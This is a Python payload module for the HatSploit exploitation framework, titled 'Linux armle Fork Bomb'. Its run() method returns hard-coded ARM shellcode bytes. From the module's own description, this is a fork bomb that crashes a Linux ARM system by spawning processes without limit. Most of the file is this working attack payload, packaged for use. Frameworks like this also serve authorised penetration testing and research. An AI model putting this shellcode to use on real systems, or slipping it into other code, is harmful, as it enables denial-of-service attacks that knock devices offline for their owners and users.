"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Linux armle Fork Bomb",
            'Payload': "linux/armle/fork_bomb",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Fork bomb payload for Linux armle.",
            'Arch': ARCH_ARMLE,
            'Platform': OS_LINUX,
            'Rank': "low",
            'Type': "one_side",
        })

    def run(self):
        return (
            b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7f\x40"
            b"\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff"
        )
